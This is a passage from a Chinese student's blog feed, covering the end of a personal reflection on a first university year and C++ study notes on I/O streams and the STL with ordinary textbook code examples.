id="改变">改变</h1><p>经过一个学期的适应，我在寒假期间也仔细反思了一下自己的问题，并做出了一些改变。</p><ul><li>认真听课，不迟到，也不早退，不缺课</li><li>找寻自己的方向，探索自己喜欢的方向，找到自己的兴趣</li><li>尽量更多的参加的课外活动，利用好自身的资源</li><li>规划好自己时间，做到能够掌控自己的一切</li></ul><p>而此刻我坐在这里，回顾当时自己的思考，我认为我的这个学期，我过的是相当充实的。</p><p>这第二个学期，我只有在学校解封那一天，和室友出去浪的那一晚上，逃了一节公选课，其余的时候，我从未逃过一节课，即使它是水课，不听的状况仍然也会出现，但是能够认真去做自己事情也算是一种进步，自己感兴趣的地方也会听一听。</p><p>其他的主要的课程，我上课听的时候真的有的时候是晕晕乎乎的，特别是线性代数课程，由于我并没有预习过，每节课都很难受，看着自己陌生的概念，她讲着，我还在看之前的内容。所以我课下作业的时候，会花大量的时间去复习ppt，想清楚每一个细节，作业也会很认真的完成，最后结果也令我非常的满意。其他的课程我几乎也是这样去学习的，我始终坚信，大学的课程并不是为了考倒你，即使会有几个难题，只要平时勤于思考，考试周认真复习，想取得好成绩绝对是不难的。</p><p>我也重拾自己初中的兴趣爱好，踢足球，即使我的身材有点走样了，技术也很不是很好，但是我依然选择加入了院里的足球队，参加过组织的训练，认识了很多学长，很多朋友。我们一同征战华工杯，即使我们在小组内就被淘汰了，我们没有失掉自己的信心，大家相聚一起，有球踢，有天聊，开心就好。</p><p>课外的竞赛方面，我跟两个数院的学长参加了美赛，我是作为论文手，我当时课下自学了latex排版，最终的翻译排版都是由我完成的。结果也非常令我出乎意料，拿了一个F（Finalist）奖(获奖率比较低)，当时真的很激动开心，可以算是我大学第一个竞赛的奖项。值得一提的还有我人生中第一笔奖学金，新生学习优秀奖学金（600元）。这些都是对于我的努力的肯定，心里的确是非常的开心。</p><p>课余的学习生活中，我也学习过不少的课外知识，学习过py，cpp和linux命令行，这些要么在我<ahref="https://github.com/">github的仓库</a>里，要么在<ahref="https://hustlixiang21.github.io/">我的博客</a>里都留下了记录，我感觉更多的还是被课内繁杂的课程占用了大部分的时间，被加权分数所裹挟，我深知自己不该把加权看的太重，但是周围的环境却时刻提醒着我自己，需要拿到保研名额并不容易。而我现在的想法就是<strong>保持+拓宽</strong>。保持住自己的加权就行，不必日日夜夜围绕着分数，我觉的更重要的还是练就自己一身的本领，学习自己感兴趣的技术。如果可以，加入一个科研团队，锻炼自己的科研水平。</p><h1 id="总结">总结</h1><p>在华科的一年时光就这么过去了，而自己也褪去了年幼时的那份稚嫩，羽翼渐丰。这一年里，有对新生活的不断适应与改变，认识了诸多好友，参与了许多有趣的活动，收获了不可多得的快乐；在学习生活方面也取得了不错的成绩，学年加权91.15，位列4/98，甚至拿了美赛的一个奖项；情感方面，少了高中时的一些臭毛病，可以说是慢慢走向正轨，也不知不觉在一起三年多了，希望以后的路也能继续一起走完吧。</p><p>至于对未来的憧憬，希望自己能够成为一个自己想要成为的人，走出国门去看看世界，抑或是进入国内更高层次的学府去深造，一份安稳的工作，一个美满的家庭，其实这已经是很多人梦寐以求的生活，是以不敢奢望太多。我只知我不惧未知，也敢于拼搏…</p><blockquote><p>拥有梦想是生活得以忍受的理由。</p></blockquote><p>深知自己文笔有限，还是多读读书，多写点东西慢慢提升吧，这一年的回顾，就到这了…</p><p align="right"><font size=4><b>八月四日晚八点，于校图书馆</b></font></p><hr /><p><br></p><p style="text-align:center;font-size:20px;">最后附上几张照片，以纪念这匆匆逝去的一年。</p><div class="gallery-container" data-type="data" data-button="" data-limit="10" data-first="10">    <div class="gallery-items">[{"url":"https://pic1.zhimg.com/80/v2-e72f84985fe12334cccd92b012f72336_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-e858eda3937d5b629d5a11013a110af4_1440w.jpeg","alt":"img","title":""},{"url":"https://pic4.zhimg.com/80/v2-025ae25e21b536130df53a272fbb34c4_1440w.jpeg","alt":"img","title":""},{"url":"https://pic1.zhimg.com/80/v2-a4f01cff9ab56596369c93d988d3db47_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-e9135724d7f5c138a04a5e6f38bd84c7_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-5a8d823eb451fc6855cb9f9a781723dd_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-0256b20f83c5e2bcdce8de54464eb774_1440w.jpeg","alt":"img","title":""},{"url":"https://pic1.zhimg.com/80/v2-ebf47ce94ec315447883cdd8f664ac91_1440w.jpeg","alt":"img","title":""}]</div>  </div>]]></content>
      
      
      <categories>
          
          <category> 个人反思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人反思 </tag>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stream Library and Input/Output</title>
      <link href="/zh/2022/08/04/CPP/Stream%20Library%20and%20Input&amp;Output/"/>
      <url>/zh/2022/08/04/CPP/Stream%20Library%20and%20Input&amp;Output/</url>
      
        <content type="html"><![CDATA[<h1 id="io-流概念与流库结构">I/O 流概念与流库结构</h1><p>一个程序创建一个 <strong>流对象</strong>： *当程序与外部环境交换信息时，有两个对象：一个是<strong>程序中的对象</strong>，另一个是 <strong>文件对象</strong>。 *流是一种抽象，负责在 <strong>数据生产者</strong> 和<strong>数据消费者</strong> 之间建立连接并管理数据流。</p><p>指定该流对象与某个文件对象建立连接。程序操作流对象，该对象通过文件系统对连接的文件对象进行操作。</p><blockquote><p>操作系统将键盘、屏幕、打印机和通信端口视为扩展文件，这种处理是通过操作系统的设备驱动程序实现的。这些设备相当于磁盘文件。</p></blockquote><p>一般意义上的读操作在流数据对象中称为<strong>提取</strong>（来自流），写操作称为<strong>插入</strong>（到流中）。</p><p style="text-align:center;">I/O 流类列表</p><p><imgsrc="https://pic3.zhimg.com/80/v2-4544fd2b14037c1638862690c745edc2_1440w.png" /></p><h1 id="输出流">输出流</h1><p>三个最重要的输出流： * ostream * ofstream * ostringstream</p><p>预定义的输出流对象： * cout 标准输出 * cerr标准错误输出，无缓冲，发送到它的内容立即输出。 * clog 类似于cerr，但有缓冲，缓冲区满时输出。</p><h2 id="构造输出流对象">构造输出流对象</h2><p>构造文件输出流的常用方法： 1. 使用默认构造函数，然后调用 open成员函数。 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ofstream myFile; <span class="comment">//定义一个静态文件输出流对象</span></span><br><span class="line">myFile.<span class="built_in">open</span>(<span class="string">&quot;filename&quot;</span>); <span class="comment">//打开文件，建立流对象与文件之间的连接</span></span><br></pre></td></tr></table></figure> 2. 在调用构造函数时指定文件名： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ofstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure>3. 在构造对象或使用 open 打开文件时可以指定模式： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ofstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>, ios_base::out | ios_base::binary)</span></span>;</span><br></pre></td></tr></table></figure> 4.还可以使用同一个流对象依次打开不同的文件（一次只能打开一个）。</p><h2 id="文件输出流成员函数">文件输出流成员函数</h2><p>三种类型： * 与操纵符等效的成员函数。 * 执行无格式写操作的成员函数。* 其他修改流状态的成员函数，与操纵符或插入运算符不同。</p><p>文件输出流成员函数 * open 函数 * 将流与特定磁盘文件关联。 *需要指定打开模式。 * put 函数 * 向输出流写入一个字符。 * write 函数 *将内存中的一块内容写入文件输出流。 * seekp 和 tellp 函数 *操作文件流的内部指针。 * close 函数 * 关闭与文件输出流关联的磁盘文件。 *错误处理函数 * 写入流时的错误处理。</p><h2 id="输出到文本文件">输出到文本文件</h2><p>系统将标准输出设备显示视为文本文件，因此我们使用输出到标准设备作为例子来介绍文本文件输出格式控制。</p><h3 id="插入运算符">插入运算符</h3><p>插入（&lt;&lt;）运算符：为所有标准 C++数据类型预设计，用于将字节传输到输出流对象。</p><h3 id="操纵符">操纵符</h3><p>插入运算符与操纵符一起工作以控制输出格式。 * 许多操纵符在 ios_base类中定义（如 hex()）和 &lt;iomanip&gt; 头文件中定义（如setprecision()）。 * 控制输出宽度：在流中放置 setw 操纵符或调用 width成员函数以指定每个项目的输出宽度。 &gt; setw 和 width仅影响紧随其后的输出项，但其他流格式操纵符在更改之前保持有效。 *dec、oct 和 hex 操纵符设置输入和输出的默认基数。</p><h4 id="设置宽度">设置宽度</h4><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%BD%BF%E7%94%A8width%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E5%AE%BD%E5%BA%A6/main.cpp">width源代码</a> <ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%BD%BF%E7%94%A8setw%E6%93%8D%E7%BA%B5%E7%AC%A6%E6%8C%87%E5%AE%9A%E5%AE%BD%E5%BA%A6/main.cpp">setw源代码</a></p><blockquote><p>width 成员函数在 iostream 中声明。如果使用带参数的 setw或任何其他操纵符，必须包含 <strong>iomanip</strong>。</p></blockquote><h4 id="对齐">对齐</h4><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E8%AE%BE%E7%BD%AE%E5%AF%B9%E9%BD%90%E6%96%B9%E5%BC%8F/main.cpp">设置对齐源代码</a></p><h4 id="setiosflags-操纵符">setiosflags 操纵符</h4><p>在本程序中，通过使用带参数的 setiosflags操纵符设置左对齐。setiosflags 在 iomanip 头文件中定义。 * 参数ios_base::left 是 ios_base 的静态常量，因此引用时必须包含 ios_base::前缀。 * 在这里，我们需要使用 resetiosflags 操纵符来<strong>关闭左对齐标志</strong>。setiosflags 与 width 和 setw 不同，它的<strong>效果是持久的</strong>，直到使用 resetiosflags 恢复默认值。 *setiosflags 的参数是流的格式标志值，可以使用按位或（|）运算符<strong>组合</strong>。</p><p><imgsrc="https://pic4.zhimg.com/80/v2-aebc935a529984f183707440dd181431_1440w.png" /></p><h4 id="精度">精度</h4><p>浮点输出精度的默认值为 6，例如：3466.98。 * 要更改精度：setprecision操纵符（在 iomanip 头文件中定义）。 * 如果未指定 fixed 或scientific，则精度值表示有效数字的数量。 * 如果设置了 ios_base::fixed 或ios_base::scientific，则精度值表示小数点后的位数。</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E7%B2%BE%E5%BA%A6/main.cpp">控制输出精度- 未指定 fixed 或 scientific</a> <ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E7%B2%BE%E5%BA%A6%E2%80%94%E6%8C%87%E5%AE%9Afixed/main.cpp">控制输出精度- 指定 fixed</a> <ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E7%B2%BE%E5%BA%A6%E2%80%94%E6%8C%87%E5%AE%9Ascientific">控制输出精度- 指定 scientific</a></p><h2 id="输出到二进制文件">输出到二进制文件</h2><h3 id="二进制文件流">二进制文件流</h3><p>在 ofstream构造函数中使用模式参数指定二进制输出模式；以通常方式构造流，然后在文件打开后使用setmode 成员函数更改模式；通过二进制文件输出流对象完成输出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Date</span> &#123; </span><br><span class="line"><span class="type">int</span> mon, day, year; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Date dt = &#123; <span class="number">6</span>, <span class="number">10</span>, <span class="number">92</span> &#125;;</span><br><span class="line">  <span class="function">ofstream <span class="title">file</span><span class="params">(<span class="string">&quot;date.dat&quot;</span>, ios_base::binary)</span></span>;</span><br><span class="line">  file.<span class="built_in">write</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span> *&gt;(&amp;dt),<span class="built_in">sizeof</span>(dt));</span><br><span class="line">  file.<span class="built_in">close</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>write函数在遇到空字符时不会停止，因此可以写入完整的类结构。此函数接受两个参数：一个char 指针（实际地址）和要写入的字节数。<strong>注意需要使用reinterpret_cast 显式将对象的地址转换为 char * 类型。</strong></p></blockquote><h2 id="输出到字符串">输出到字符串</h2><p>使用字符串作为输出流的目标可以实现将其他数据类型转换为字符串的功能。</p><h3 id="字符串输出流-ostringstream">字符串输出流 (ostringstream)</h3><p>用于构造字符串。</p><p>函数： * 支持 ofstream 类的所有操作，除了 open 和 close。 * str函数可以返回当前构造的字符串。</p><p>典型应用 * 将数值转换为字符串。</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%95%B0%E5%80%BC%E8%BD%AC%E5%8C%96%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2/main.cpp">使用ostringstream 将数值转换为字符串</a></p><h1 id="输入流">输入流</h1><p>重要的输入流类： * istream 类最适合顺序文本模式输入。cin 是它的实例。* ifstream 类支持磁盘文件输入。 * istringstream。</p><h2 id="构造输入流对象">构造输入流对象</h2><ul><li>如果在构造函数中指定了文件名，则在构造对象时会自动打开文件。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li>使用 open 函数在调用默认构造函数后打开文件。 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifstream myFile; <span class="comment">//创建一个文件流对象</span></span><br><span class="line">myFile.<span class="built_in">open</span>(<span class="string">&quot;filename&quot;</span>); <span class="comment">//打开文件 &quot;filename&quot;</span></span><br></pre></td></tr></table></figure></li><li>打开文件时可以指定模式。 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>, ios_base::in | ios_base::binary)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用提取运算符从文本文件输入">使用提取运算符从文本文件输入</h2><p>提取运算符 (&gt;&gt;) 为所有标准 C++数据类型预设计。它是从输入流对象获取字节的最简单方法。ios类中的许多操纵符可以应用于输入流。但只有少数对输入流对象有实际影响，最重要的是基操纵符dec、oct 和 hex。</p><h2 id="输入流相关函数">输入流相关函数</h2><ul><li>open 函数将流与特定磁盘文件关联。</li><li>get 函数与提取运算符 (&gt;&gt;) 非常相似，主要区别在于 get函数在读取数据时包括空白字符。（在第 6 章介绍）</li><li>getline函数从输入流中读取多个字符，并允许指定输入终止字符。读取完成后，终止字符从读取内容中移除。（在第6 章介绍）</li><li>read成员函数从文件读取字节到指定内存区域，长度参数确定要读取的字节数。在文本模式文件中，读取在遇到文件结束或文件结束标记字符时结束。</li><li>seekg 函数用于设置文件输入流中读取数据的位置指针。</li><li>tellg 函数返回文件读取指针的当前位置。</li><li>close 函数关闭与文件输入流关联的磁盘文件。</li></ul><h2 id="示例">示例</h2><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E4%B8%80%E4%B8%AA%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AE%B0%E5%BD%95%E5%88%B0%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%84%E4%B8%AD/main.cpp">从文件读取二进制记录到结构</a><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E7%94%A8seekg%E5%87%BD%E6%95%B0%E8%AE%BE%E7%BD%AE%E4%BD%8D%E7%BD%AE%E6%8C%87%E9%92%88/main.cpp">使用seekg 函数设置位置指针</a> <ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E8%AF%BB%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%B9%B6%E6%98%BE%E7%A4%BA%E5%87%BA%E5%85%B6%E4%B8%AD0%E5%85%83%E7%B4%A0%E7%9A%84%E4%BD%8D%E7%BD%AE/main.cpp">读取文件并显示其中0 元素的位置</a></p><h2 id="从字符串输入-istringstream">从字符串输入 (istringstream)</h2><p>用于从字符串读取数据，在构造函数中设置要读取的字符串。</p><p>函数 * 支持 ifstream 类的所有操作，除了 open 和 close。</p><p>典型应用 * 将字符串转换为数值。</p><h1 id="输入输出流">输入/输出流</h1><h2 id="两个重要的输入输出流">两个重要的输入/输出流</h2><p>一个 iostream 对象可以是数据的源或目的地。 * 两个重要的 I/O 流类是从iostream 派生的：fstream 和 stringstream。 * 这些类继承了前面描述的istream 和 ostream 类的功能。</p><h2 id="fstream-类">fstream 类</h2><p>fstream 类支持磁盘文件的输入和输出。 *如果需要在同一程序中从特定磁盘文件读取和写入，可以构造一个 fstream对象。 * 一个 fstream对象是一个单一流，具有两个逻辑子流，一个用于输入，另一个用于输出。</p><h2 id="stringstream-类">stringstream 类</h2><p>stringstream 类支持面向字符串的输入和输出。 *可用于对同一字符串内容进行交替的读写操作，也由两个逻辑子流组成。</p><h1 id="综合示例---个人银行账户管理">综合示例 - 个人银行账户管理</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update5">点击查看源代码</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Generic Programming and C++ Standard Template Library (STL)</title>
      <link href="/zh/2022/08/04/CPP/Generic%20Programming%20and%20C++%20Standard%20Template%20Library%20(STL)/"/>
      <url>/zh/2022/08/04/CPP/Generic%20Programming%20and%20C++%20Standard%20Template%20Library%20(STL)/</url>
      
        <content type="html"><![CDATA[<h1 id="泛型编程与-stl-结构">泛型编程与 STL 结构</h1><h2 id="泛型编程的基本概念">泛型编程的基本概念</h2><p>指编写<strong>不依赖于特定数据类型</strong>的程序。模板是泛型编程的主要工具。</p><p>术语：概念</p><p>用于定义具有某些功能的数据类型。例如： *“所有可以比较（使用比较运算符）的数据类型”的概念表示为 Comparable *“具有公共复制构造函数并可以使用 ‘=’ 赋值的数据类型”的概念表示为Assignable * “所有可以比较、具有公共复制构造函数并可以使用 ‘=’赋值的数据类型”的概念表示为 Sortable。</p><p>对于两个不同的概念 A 和 B，如果概念 A 所需的所有函数也被概念 B所需，则称概念 B 是概念 A 的子概念。例如： * Sortable 是 Comparable 和Assignable 的子概念</p><blockquote><p>实际上，这个子概念类似于从基类派生的类。</p></blockquote><p>术语：模型</p><p>模型：符合某个概念的数据类型称为该概念的模型 * int 类型是 Comparable概念的模型； * 静态数组类型不是 Assignable概念的类型（静态数组不能被赋值）。</p><p>使用概念作为模板参数名称</p><ul><li>许多 STL 实现代码使用概念来命名模板参数。</li><li>给一个概念命名，并将该名称用作模板参数名称。</li></ul><p>例如： 表示一个函数模板的原型，如 insertionSort： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">Sortable</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertionSort</span><span class="params">(Sortable a[], <span class="type">int</span> n)</span></span>;</span><br></pre></td></tr></table></figure></p><h1 id="stl-介绍">STL 介绍</h1><p><strong>标准模板库</strong>提供了一些非常常用的数据结构和算法。</p><p>STL 的基本组成部分： * 容器 * 迭代器 * 函数对象 * 算法</p><p>基本关系： *迭代器是算法与容器之间的桥梁。使用迭代器作为算法参数，通过迭代器访问容器，而不是直接将容器作为算法参数传递；* 使用函数对象作为算法参数，而不是将函数执行的操作作为算法的一部分。</p><p>关系图：</p><p><imgsrc="https://pic4.zhimg.com/80/v2-277324313f500492215f4604944da7fb_1440w.png" /></p><h2 id="stl-的基本组成部分---容器">STL 的基本组成部分 - 容器</h2><p>容器是保存一组元素的对象。容器类库包括七种基本容器：vector、deque、list、set、multiset、map和 multimap。</p><ul><li>顺序容器：array、vector、deque、forward_list（单链表）、list（双链表）；</li><li>有序关联容器：set、multiset、map、multimap；</li><li>无序关联容器：unordered_set、unordered_multiset、unordered_map、unordered_multimap。</li></ul><p>容器适配器：stack、queue、priority_queue（优先队列，底层是最大或最小二叉堆）</p><div class="note info flat"><p>要使用容器，您需要包含相应的头文件。</p></div><h2 id="stl-的基本组成部分---迭代器">STL 的基本组成部分 - 迭代器</h2><ul><li>迭代器是通用指针，提供对容器中每个元素的顺序访问方法；</li><li>提供对容器中每个元素的顺序访问方法；</li><li>可以使用 “++” 运算符获取指向下一个元素的迭代器；</li><li>可以使用 “*”运算符访问迭代器指向的元素。如果元素类型是类或结构体，还可以使用 “-&gt;”运算符直接访问该元素的成员；</li><li>一些迭代器还支持通过 “–” 运算符获取指向前一个元素的迭代器；</li><li>迭代器是通用指针：指针具有相同的特性，因此指针本身是一种迭代器；</li><li>要独立于 STL 容器使用迭代器，您需要包含头文件<code>&lt;iterator&gt;</code>。</li></ul><h2 id="stl-的基本组成部分---函数对象">STL 的基本组成部分 -函数对象</h2><ul><li>行为像函数的对象，可以像函数一样被调用。</li><li>函数对象是通用函数：任何普通函数和任何重载了 “()”运算符的类的对象都可以用作函数对象。</li><li>要使用 STL 函数对象，您需要包含头文件<code>&lt;functional&gt;</code>。</li></ul><h2 id="stl-的基本组成部分---算法">STL 的基本组成部分 - 算法</h2><ul><li>STL 包含超过 70种算法，例如：排序算法、消除算法、计数算法、比较算法、变换算法、排列算法和容器管理；</li><li>可以广泛用于不同对象和内置数据类型；</li><li>要使用 STL 算法，您需要包含头文件<code>&lt;algorithm&gt;</code>。</li></ul><h3 id="算法示例---transform-算法">算法示例 - transform 算法</h3><p>transform 算法顺序遍历由两个迭代器 first 和 last 指向的元素； *使用每个元素的值作为函数对象 op 的参数； * 通过迭代器 result 顺序输出 op的返回值； * 遍历完成后，result迭代器指向最后一个输出元素之后的位置，transform 将返回该迭代器。</p><p>例如，以下可能是 transform 算法的一种实现： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">InputIterator</span>, <span class="keyword">class</span> <span class="title class_">OutputIterator</span>, <span class="keyword">class</span> <span class="title class_">UnaryFunction</span>&gt;</span><br><span class="line"><span class="function">OutputIterator <span class="title">transform</span><span class="params">(InputIterator first, InputIterator last, OutputIterator result, UnaryFunction op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (;first != last; ++first, ++result) </span><br><span class="line">    &#123;</span><br><span class="line">      *result = <span class="built_in">op</span>(*first);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>示例： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从标准输入读取几个整数，存储在 vector 容器中，输出它们的负值</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">s</span><span class="params">(N)</span></span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; s[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">transform</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout,<span class="string">&quot; &quot;</span>),<span class="built_in">negate</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="迭代器">迭代器</h1><p>迭代器是算法与容器之间的桥梁： * 迭代器用于访问容器中的元素 *算法不直接操作容器中的数据，而是通过迭代器间接操作</p><p>算法与容器是独立的： * 添加新算法不会影响容器实现 *添加新容器时，现有算法仍然可以应用</p><h2 id="输入流迭代器和输出流迭代器">输入流迭代器和输出流迭代器</h2><p>输入流迭代器 * <code>istream_iterator&lt;T&gt;</code> * 以输入流（如cin）作为参数构造 * 可以使用 <em>(p++) 获取下一个输入元素 输出流迭代器</em> <code>ostream_iterator&lt;T&gt;</code> * 构造时需要提供输出流（如cout） * 可以使用 (*p++) = x 将 x 输出到输出流</p><p>两者都属于适配器 * 适配器是用于为现有对象提供新接口的对象 *输入流适配器和输出流适配器为流对象提供迭代器接口</p><p>程序示例： <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从标准输入读取几个实数，输出它们的平方</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">square</span><span class="params">(<span class="type">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">transform</span>(<span class="built_in">istream_iterator</span>&lt;<span class="type">double</span>&gt;(cin),<span class="built_in">istream_iterator</span>&lt;<span class="type">double</span>&gt;(),<span class="built_in">ostream_iterator</span>&lt;<span class="type">double</span>&gt;(cout,<span class="string">&quot;\t&quot;</span>),square);</span><br><span class="line">    <span class="comment">//istream_iterator&lt;double&gt;() 调用输入流迭代器的默认构造函数，使其指向输入流的结束位置。</span></span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//如果不手动终止程序，它将一直运行，因为输入流始终在等待您的输入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="迭代器分类">迭代器分类</h2><p>按访问方法分类： <imgsrc="https://img-blog.csdnimg.cn/20200609192939833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTk2OTY5MA==,size_16,color_FFFFFF,t_70"alt="Fetching Title#2j8d" /></p><p>关系图： 